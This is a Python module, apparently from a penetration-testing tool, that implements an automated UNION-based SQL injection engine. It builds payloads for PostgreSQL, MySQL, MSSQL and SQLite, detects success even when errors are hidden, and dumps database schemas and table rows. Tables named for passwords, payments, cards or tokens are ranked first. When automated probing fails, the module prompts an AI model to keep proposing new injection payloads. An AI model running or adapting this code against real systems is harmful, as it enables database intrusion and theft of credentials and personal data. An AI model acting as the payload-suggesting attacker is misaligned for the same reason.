"""
SQLi data extraction engine.

Standalone module - does NOT make HTTP requests directly. It receives
an `inject_fn` callback from the calling plugin and uses it to fire
UNION SELECT payloads and read back reflected values.

Why this needs to be smarter than "look for a DB error string":
Some applications catch every database exception and silently re-render
the same page regardless of whether a UNION SELECT's column count was
right or wrong. On these targets, absence of an error message means
NOTHING - a rejected payload and an accepted-but-unreflected payload
look byte-identical. This engine compares every probe response against
a genuine "wrong credentials, no injection" baseline and looks for ANY
behavioral difference, not just explicit error text.

When automated probing (widened column range, multiple comment styles,
multiple quote-closing contexts) is exhausted, this hands off to an
iterative AI agent loop: each round the AI sees the full probe history
and proposes ONE new payload to try, we execute it and report the
result back, and this repeats for a bounded number of rounds. This is
a real trial-and-error loop, not a single one-shot guess.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Awaitable, Callable

from stelarstrike.utils.logger import get_logger

log = get_logger(__name__)

_HIGH_VALUE_KEYWORDS = [
    "user", "admin", "auth", "login", "credential", "password",
    "account", "card", "transaction", "payment", "merchant",
    "token", "session", "secret", "key", "api", "customer",
    "member", "profile", "setting", "config", "order",
]

_DB_BUILDERS: dict[str, dict[str, str]] = {
    "postgresql": {
        "version": "version()",
        "table_names": "string_agg(tablename,' ' ORDER BY tablename)",
        "table_schema": "pg_tables",
        "schema_filter": "schemaname='public'",
        "col_agg": "string_agg(column_name,' ' ORDER BY ordinal_position)",
        "col_table": "information_schema.columns",
        "col_filter": "table_name='{table}'",
        "comment": "-- -",
    },
    "mysql": {
        "version": "version()",
        "table_names": "group_concat(table_name ORDER BY table_name SEPARATOR ' ')",
        "table_schema": "information_schema.tables",
        "schema_filter": "table_schema=database()",
        "col_agg": "group_concat(column_name ORDER BY ordinal_position SEPARATOR ' ')",
        "col_table": "information_schema.columns",
        "col_filter": "table_name='{table}' AND table_schema=database()",
        "comment": "-- -",
    },
    "mssql": {
        "version": "@@version",
        "table_names": "string_agg(name,'|')",
        "table_schema": "sysobjects",
        "schema_filter": "xtype='U'",
        "col_agg": "string_agg(name,'|')",
        "col_table": "sys.columns",
        "col_filter": "object_id=OBJECT_ID('{table}')",
        "comment": "--",
    },
    "sqlite": {
        "version": "sqlite_version()",
        "table_names": "group_concat(name,' ')",
        "table_schema": "sqlite_master",
        "schema_filter": "type='table'",
        "col_agg": "group_concat(name,' ')",
        "col_table": "pragma_table_info('{table}')",
        "col_filter": "",
        "comment": "--",
    },
}


@dataclass
class ExtractionResult:
    db_version: str = ""
    db_type: str = ""
    tables: list[str] = field(default_factory=list)
    columns: dict[str, list[str]] = field(default_factory=dict)
    data: dict[str, list[dict]] = field(default_factory=dict)
    col_count: int | None = None
    reflected_col: int | None = None

    def to_dict(self) -> dict:
        return {
            "db_version": self.db_version,
            "db_type": self.db_type,
            "tables": self.tables,
            "columns": self.columns,
            "data": self.data,
            "col_count": self.col_count,
            "reflected_col": self.reflected_col,
        }

    def summary(self) -> str:
        lines = [
            f"Database: {self.db_type} {self.db_version}",
            f"Tables found ({len(self.tables)}): {', '.join(self.tables) or 'none'}",
        ]
        for table in self.tables:
            cols = self.columns.get(table, [])
            rows = self.data.get(table, [])
            lines.append(f"\n  [{table}] - {len(cols)} column(s), {len(rows)} row(s) sampled")
            if cols:
                lines.append(f"    Columns: {', '.join(cols)}")
            for row in rows[:5]:
                preview = {k: str(v)[:60] for k, v in row.items()}
                lines.append(f"    {preview}")
            if len(rows) > 5:
                lines.append(f"    ... and {len(rows) - 5} more row(s)")
        return "\n".join(lines)

    def to_markdown_tables(self) -> str:
        """Render extracted data as GitHub-flavored markdown tables, one per table."""
        if not self.tables and not self.db_version:
            return "_No data extracted._"

        lines = [f"**Database:** {self.db_type} {self.db_version}", ""]

        if self.tables and not self.data and not self.columns:
            lines.append(f"**Tables discovered ({len(self.tables)}):** {', '.join(self.tables)}")
            return "\n".join(lines)

        for table in self.tables:
            cols = self.columns.get(table, [])
            rows = self.data.get(table, [])
            if not cols:
                continue

            lines.append(f"### Table: `{table}`")
            lines.append("")
            lines.append("| " + " | ".join(cols) + " |")
            lines.append("|" + "|".join(["---"] * len(cols)) + "|")
            for row in rows:
                cells = [str(row.get(c, "")).replace("|", "\\|")[:80] for c in cols]
                lines.append("| " + " | ".join(cells) + " |")
            if not rows:
                lines.append("_No rows sampled._")
            lines.append("")

        return "\n".join(lines)


class SQLiExtractor:
    _SENTINEL_START = "STELR0"
    _SENTINEL_END = "0RLETS"
    _LITERAL_PROBE = "STELRPROBE"
    _BASELINE_MARKER = "stelarstrike_baseline_no_injection_probe"

    _COMMENT_STYLES = ["-- -", "--", "#", ";--", ""]
    _PREFIXES = [("'", "string"), (" ", "numeric"), ("')", "paren"), ('"', "dquote")]

    _MISMATCH_SIGNALS = (
        "same number of columns",
        "each union query must have",
        "different number of columns",
        "number of columns",
        "must have the same",
    )
    _TYPE_ERROR_SIGNALS = (
        "invalid input syntax for type integer",
        "integer out of range",
        "invalid input syntax for",
        "union types",
        "conversion failed",
    )

    def __init__(
        self,
        inject_fn: Callable[[str], Awaitable[str]],
        db_type: str,
        config: dict,
        ai_client: Callable[..., str] | None = None,
    ):
        self.inject = inject_fn
        self.db_type = db_type if db_type in _DB_BUILDERS else "postgresql"
        self.config = config
        self.db = _DB_BUILDERS[self.db_type]
        self.result = ExtractionResult(db_type=self.db_type)
        self._col_count: int | None = None
        self._reflected_col: int | None = None
        self._inject_prefix: str = "'"
        self._inject_comment: str = self.db["comment"]
        self._try_positions_first: list[int] = []
        self.ai_client = ai_client
        self._baseline_cache: str | None = None
        self._probe_history: list[dict] = []

    async def run(self) -> ExtractionResult:
        """Run the full extraction pipeline and return the result."""
        extract_goals = self.config.get("extract", ["version", "schema"])

        if "version" in extract_goals:
            self.result.db_version = await self._get_version() or "unknown"

        if "schema" in extract_goals:
            self.result.tables = await self._get_tables()

        self.result.col_count = self._col_count
        self.result.reflected_col = self._reflected_col

        target_tables = self._rank_tables()
        max_tables = int(self.config.get("max_tables", 20))

        for table in target_tables[:max_tables]:
            cols = await self._get_columns(table)
            if cols:
                self.result.columns[table] = cols

        max_rows = int(self.config.get("max_rows_per_table", 50))
        for table in target_tables[:max_tables]:
            cols = self.result.columns.get(table, [])
            if not cols:
                continue
            rows = await self._get_table_data(table, cols, limit=max_rows)
            if rows:
                self.result.data[table] = rows

        return self.result

    # ------------------------------------------------------------------
    # High-level extraction steps
    # ------------------------------------------------------------------

    async def _get_version(self) -> str:
        return await self._union_scalar(self.db["version"])

    async def _get_tables(self) -> list[str]:
        d = self.db
        subquery = f"(SELECT {d['table_names']} FROM {d['table_schema']} WHERE {d['schema_filter']})"
        raw = await self._union_scalar(subquery)
        if not raw:
            return []
        sep = "|" if self.db_type == "mssql" else " "
        return [t.strip() for t in raw.split(sep) if t.strip()]

    async def _get_columns(self, table: str) -> list[str]:
        d = self.db
        col_filter = d["col_filter"].format(table=table)

        if self.db_type == "sqlite":
            subquery = f"(SELECT {d['col_agg']} FROM {d['col_table'].format(table=table)})"
        elif col_filter:
            subquery = f"(SELECT {d['col_agg']} FROM {d['col_table']} WHERE {col_filter})"
        else:
            subquery = f"(SELECT {d['col_agg']} FROM {d['col_table']})"

        raw = await self._union_scalar(subquery)
        if not raw:
            return []
        sep = "|" if self.db_type == "mssql" else " "
        return [c.strip() for c in raw.split(sep) if c.strip()]

    async def _get_table_data(self, table: str, columns: list[str], limit: int = 50) -> list[dict]:
        if not columns:
            return []
        max_cols = int(self.config.get("max_columns_per_table", 30))
        cols = columns[:max_cols]

        if self.db_type == "postgresql":
            parts = [f"COALESCE({c}::text,'NULL')" for c in cols]
            concat = "||':'||".join(parts)
            subquery = (
                f"(SELECT string_agg({concat},'|||') "
                f"FROM (SELECT {','.join(cols)} FROM {table} LIMIT {limit}) sub)"
            )
        elif self.db_type == "mysql":
            parts = [f"COALESCE({c},'NULL')" for c in cols]
            concat = f"CONCAT_WS(':',{','.join(parts)})"
            subquery = (
                f"(SELECT GROUP_CONCAT({concat} SEPARATOR '|||') "
                f"FROM (SELECT {','.join(cols)} FROM {table} LIMIT {limit}) sub)"
            )
        else:
            return []  # MSSQL/SQLite row extraction is complex - schema is sufficient proof

        raw = await self._union_scalar(subquery)
        if not raw:
            return []

        rows = []
        for row_str in raw.split("|||"):
            values = row_str.split(":")
            row = {
                col: (None if i < len(values) and values[i] == "NULL" else (values[i] if i < len(values) else None))
                for i, col in enumerate(cols)
            }
            rows.append(row)
        return rows

    # ------------------------------------------------------------------
    # Baseline
    # ------------------------------------------------------------------

    async def _get_baseline(self) -> str:
        """A definitely-wrong, non-injected value - the 'normal failure' response."""
        if self._baseline_cache is None:
            try:
                self._baseline_cache = await self.inject("")
            except Exception:  # noqa: BLE001
                self._baseline_cache = ""
        return self._baseline_cache

    def _differs_from_baseline(self, response: str, baseline: str) -> bool:
        """
        True if `response` shows ANY sign of behaving differently from the
        baseline failure response - length, content, or explicit signals.
        This is what lets us detect success on apps that never show error text.
        """
        if response == baseline:
            return False
        if abs(len(response) - len(baseline)) > 5:
            return True
        # Same-ish length but different content - still worth investigating
        return response.strip() != baseline.strip()

    # ------------------------------------------------------------------
    # Core UNION injection
    # ------------------------------------------------------------------

    def _wrap_sentinel(self, subquery: str) -> str:
        s, e = self._SENTINEL_START, self._SENTINEL_END
        if self.db_type in ("postgresql", "sqlite"):
            return f"'{s}'||({subquery})||'{e}'"
        if self.db_type == "mysql":
            return f"CONCAT('{s}',({subquery}),'{e}')"
        if self.db_type == "mssql":
            return f"'{s}'+CAST(({subquery}) AS NVARCHAR(MAX))+'{e}'"
        return f"'{s}'||({subquery})||'{e}'"

    def _build_union(self, col_count: int, position: int, value_expr: str, comment: str, prefix: str = "'") -> str:
        parts = ["NULL"] * col_count
        parts[position] = value_expr
        return f"{prefix} UNION SELECT {','.join(parts)}{comment}"

    async def _find_col_count_and_position(self, wrapped: str, comment: str) -> bool:
        """
        Multi-phase UNION discovery with baseline-diff detection (works even
        when the target silently swallows every SQL error) plus a genuinely
        iterative AI fallback when automated probing is exhausted.
        """
        baseline = await self._get_baseline()
        self._probe_history = []

        # Phase 1: find candidate column counts across contexts/comment styles,
        # using baseline-diff instead of "absence of error text" as the signal.
        working_combos: list[tuple[int, str, str]] = []
        for prefix, ctx_label in self._PREFIXES:
            for comment_style in self._COMMENT_STYLES:
                found_for_context = False
                for col_count in range(1, 21):
                    null_payload = f"{prefix} UNION SELECT {','.join(['NULL'] * col_count)}{comment_style}"
                    try:
                        resp = await self.inject(null_payload)
                    except Exception as exc:  # noqa: BLE001
                        log.debug(f"sqli-extract: null probe failed ({ctx_label}, n={col_count}): {exc}")
                        continue

                    lower = resp.lower()
                    if any(s in lower for s in self._MISMATCH_SIGNALS):
                        continue

                    if self._differs_from_baseline(resp, baseline):
                        log.debug(
                            f"sqli-extract: col_count={col_count} candidate ({ctx_label}, "
                            f"comment={comment_style!r}) - differs from baseline"
                        )
                        working_combos.append((col_count, prefix, comment_style))
                        found_for_context = True
                        break
                if found_for_context:
                    break  # one working comment style per prefix context is enough to proceed

        if working_combos:
            found = await self._probe_positions(working_combos, wrapped, baseline)
            if found:
                return True

        # Phase 2 exhausted without a confirmed reflection - hand off to the
        # iterative AI agent, which keeps trying new approaches in a real loop.
        log.info("sqli-extract: automated probing exhausted - starting AI-guided agent loop")
        if self.ai_client:
            return await self._ai_agent_loop(wrapped, baseline)

        log.debug("sqli-extract: no AI client configured - extraction cannot continue")
        return False

    async def _probe_positions(
        self, working_combos: list[tuple[int, str, str]], wrapped: str, baseline: str
    ) -> bool:
        """Phase 2: literal probe at each column position, hinted positions first."""
        for col_count, prefix, comment_style in working_combos:
            all_pos = list(range(col_count))
            hinted = [p for p in self._try_positions_first if p < col_count]
            remaining = [p for p in all_pos if p not in hinted]
            ordered_positions = hinted + remaining

            for pos in ordered_positions:
                parts = ["NULL"] * col_count
                parts[pos] = f"'{self._LITERAL_PROBE}'"
                payload = f"{prefix} UNION SELECT {','.join(parts)}{comment_style}"
                try:
                    resp = await self.inject(payload)
                except Exception as exc:  # noqa: BLE001
                    log.debug(f"sqli-extract: literal probe failed (pos={pos}): {exc}")
                    continue

                self._probe_history.append({
                    "payload": payload[:100],
                    "response_snippet": resp[:400],
                    "col_count": col_count,
                    "position": pos,
                    "differs_from_baseline": self._differs_from_baseline(resp, baseline),
                })

                if self._LITERAL_PROBE in resp:
                    log.info(
                        f"sqli-extract: found reflection at pos={pos} "
                        f"(col_count={col_count}, comment={comment_style!r})"
                    )
                    self._col_count = col_count
                    self._reflected_col = pos
                    self._inject_prefix = prefix
                    self._inject_comment = comment_style

                    if await self._verify_sentinel_extraction(col_count, pos, wrapped, prefix, comment_style):
                        return True
                    log.debug("sqli-extract: position confirmed but sentinel value extraction failed")
                    return True

        return False

    async def _verify_sentinel_extraction(
        self, col_count: int, pos: int, wrapped: str, prefix: str, comment_style: str
    ) -> bool:
        """Phase 3: verify the confirmed position actually extracts real data."""
        sentinel_payload = self._build_union(col_count, pos, wrapped, comment_style, prefix)
        try:
            sentinel_resp = await self.inject(sentinel_payload)
            value = self._extract_value(sentinel_resp)
            if value:
                log.info("sqli-extract: sentinel extraction confirmed")
                return True

            for alt_wrapped in self._alt_sentinel_expressions(self.db["version"]):
                alt_payload = self._build_union(col_count, pos, alt_wrapped, comment_style, prefix)
                alt_resp = await self.inject(alt_payload)
                value = self._extract_value(alt_resp)
                if value:
                    log.info("sqli-extract: alt sentinel expression worked")
                    return True
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli-extract: sentinel verification failed: {exc}")
        return False

    def _alt_sentinel_expressions(self, subquery: str) -> list[str]:
        s, e = self._SENTINEL_START, self._SENTINEL_END
        return [
            f"CAST('{s}' AS TEXT)||CAST(({subquery}) AS TEXT)||CAST('{e}' AS TEXT)",
            f"('{s}'||CAST(({subquery}) AS VARCHAR)||'{e}')",
            f"CONCAT('{s}',CAST(({subquery}) AS CHAR),'{e}')",
            f"({subquery})",
        ]

    # ------------------------------------------------------------------
    # Iterative AI agent loop
    # ------------------------------------------------------------------

    async def _ai_agent_loop(self, wrapped: str, baseline: str, max_rounds: int = 6) -> bool:
        """
        Genuine trial-and-error loop: each round, the AI sees the full
        probe history so far and proposes ONE next payload to try. We
        execute it, record the outcome, and feed it back next round.
        Stops early on success; otherwise runs up to `max_rounds`.
        """
        for round_num in range(1, max_rounds + 1):
            suggestion = await self._ask_ai_for_next_payload(round_num)
            if not suggestion:
                log.debug(f"sqli-extract: AI round {round_num} produced no usable suggestion")
                continue

            payload = suggestion.get("payload", "")
            col_count = suggestion.get("col_count")
            position = suggestion.get("position")
            if not payload:
                continue

            try:
                resp = await self.inject(payload)
            except Exception as exc:  # noqa: BLE001
                log.debug(f"sqli-extract: AI-suggested payload failed to send: {exc}")
                self._probe_history.append({"payload": payload[:100], "error": str(exc)[:200]})
                continue

            differs = self._differs_from_baseline(resp, baseline)
            reflected = self._LITERAL_PROBE in resp or self._SENTINEL_START in resp
            self._probe_history.append({
                "payload": payload[:100],
                "response_snippet": resp[:400],
                "differs_from_baseline": differs,
                "reflected": reflected,
                "ai_round": round_num,
            })

            log.info(
                f"sqli-extract: AI round {round_num}/{max_rounds} - "
                f"payload={payload[:60]!r} differs={differs} reflected={reflected}"
            )

            if reflected and col_count and position is not None:
                self._col_count = int(col_count)
                self._reflected_col = int(position)
                self._inject_prefix = suggestion.get("prefix", "'")
                self._inject_comment = suggestion.get("comment", self.db["comment"])
                if await self._verify_sentinel_extraction(
                    self._col_count, self._reflected_col, wrapped,
                    self._inject_prefix, self._inject_comment,
                ):
                    return True
                return True  # position confirmed even if sentinel verify didn't pan out

        log.info(f"sqli-extract: AI agent loop exhausted after {max_rounds} rounds without confirmation")
        return False

    async def _ask_ai_for_next_payload(self, round_num: int) -> dict | None:
        """Ask the AI for exactly one next payload to try, given full history so far."""
        history_text = "\n\n".join(
            f"Attempt {i+1}: payload={h.get('payload')!r}\n"
            f"  differs_from_baseline={h.get('differs_from_baseline', 'N/A')}, "
            f"reflected={h.get('reflected', 'N/A')}\n"
            f"  response: {h.get('response_snippet', h.get('error', ''))[:200]}"
            for i, h in enumerate(self._probe_history[-10:])  # last 10 attempts only
        )

        prompt = (
            "You are an expert penetration tester performing SQL injection column "
            "discovery via UNION-based extraction. The application confirmed vulnerable "
            "to SQL injection (authentication bypass works), but automated UNION column "
            f"probing has not yet found the reflected column after {len(self._probe_history)} attempts. "
            "The application may silently swallow SQL errors (no visible error text even "
            "on a column-count mismatch), so you must reason about what to try next based "
            "on response differences, not error messages.\n\n"
            f"Target DB type: {self.db_type}\n\n"
            f"Attempt history:\n{history_text or '(no attempts yet)'}\n\n"
            "Propose exactly ONE new payload to try. Consider: wider column ranges, "
            "different comment styles (-- -, --, #, ;--), different quote-closing "
            "contexts, or filling non-target columns with non-NULL values in case the "
            "application requires truthy values to proceed past a check.\n\n"
            'Reply in JSON only: {"payload": "<the exact SQL suffix to inject after the '
            'field value>", "col_count": N, "position": N, "prefix": "'
            '<string context character(s) before UNION, e.g. \'>", "comment": "<comment '
            'style used, e.g. -- ->", "reasoning": "<one sentence>"}'
        )

        try:
            result_text = self._call_ai(prompt)
            cleaned = result_text.strip()
            if cleaned.startswith("```"):
                cleaned = cleaned.strip("`")
                if cleaned.startswith("json"):
                    cleaned = cleaned[4:]
            hint = json.loads(cleaned.strip())
            if hint.get("payload"):
                log.debug(f"sqli-extract: AI round {round_num} reasoning: {hint.get('reasoning', '')}")
                return hint
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli-extract: AI suggestion round {round_num} failed: {exc}")
        return None

    def _call_ai(self, prompt: str) -> str:
        """Call the AI client. The client itself is responsible for handling
        provider-specific quirks (e.g. some models rejecting temperature
        overrides) and returns an empty string on failure rather than raising."""
        if self.ai_client is None:
            return ""
        try:
            return self.ai_client(prompt) or ""
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli-extract: AI call raised unexpectedly: {exc}")
            return ""

    # ------------------------------------------------------------------
    # Value extraction & scalar UNION
    # ------------------------------------------------------------------

    async def _union_scalar(self, subquery: str) -> str:
        comment = self.db["comment"]
        wrapped = self._wrap_sentinel(subquery)

        if self._col_count is not None and self._reflected_col is not None:
            payload = self._build_union(
                self._col_count, self._reflected_col, wrapped, self._inject_comment, self._inject_prefix
            )
            try:
                response = await self.inject(payload)
                value = self._extract_value(response)
                if value:
                    log.debug(f"sqli-extract: extracted (cached position): {value[:60]!r}")
                    return value
                log.debug("sqli-extract: cached position no longer reflects - rediscovering")
                self._col_count = None
                self._reflected_col = None
            except Exception as exc:  # noqa: BLE001
                log.debug(f"sqli-extract: cached inject failed: {exc}")
                return ""

        found = await self._find_col_count_and_position(wrapped, comment)
        if not found:
            return ""

        payload = self._build_union(
            self._col_count, self._reflected_col, wrapped, self._inject_comment, self._inject_prefix
        )
        try:
            response = await self.inject(payload)
            value = self._extract_value(response)
            if value:
                log.debug(f"sqli-extract: extracted value: {value[:80]!r}")
            return value
        except Exception as exc:  # noqa: BLE001
            log.debug(f"sqli-extract: final extract inject failed: {exc}")
            return ""

    def _extract_value(self, response_body: str) -> str:
        s, e = self._SENTINEL_START, self._SENTINEL_END

        idx_start = response_body.find(s)
        if idx_start != -1:
            idx_end = response_body.find(e, idx_start + len(s))
            if idx_end != -1:
                extracted = response_body[idx_start + len(s):idx_end].strip()
                if extracted and not self._looks_like_error(extracted):
                    return extracted

        try:
            data = json.loads(response_body)
            val = self._longest_json_string(data)
            if val and len(val) > 5 and not self._looks_like_error(val):
                return val
        except (json.JSONDecodeError, TypeError, ValueError):
            pass

        return ""

    def _longest_json_string(self, obj) -> str:
        best = ""

        def walk(o):
            nonlocal best
            if isinstance(o, str):
                if len(o) > len(best):
                    best = o
            elif isinstance(o, dict):
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                for item in o:
                    walk(item)

        walk(obj)
        return best

    @staticmethod
    def _looks_like_error(value: str) -> bool:
        indicators = ["error", "syntax", "exception", "traceback", "failed", "invalid"]
        lower = value.lower()
        return any(ind in lower for ind in indicators)

    def _rank_tables(self) -> list[str]:
        scored = []
        for table in self.result.tables:
            score = sum(1 for kw in _HIGH_VALUE_KEYWORDS if kw in table.lower())
            scored.append((score, table))
        scored.sort(reverse=True)
        return [t for _, t in scored]
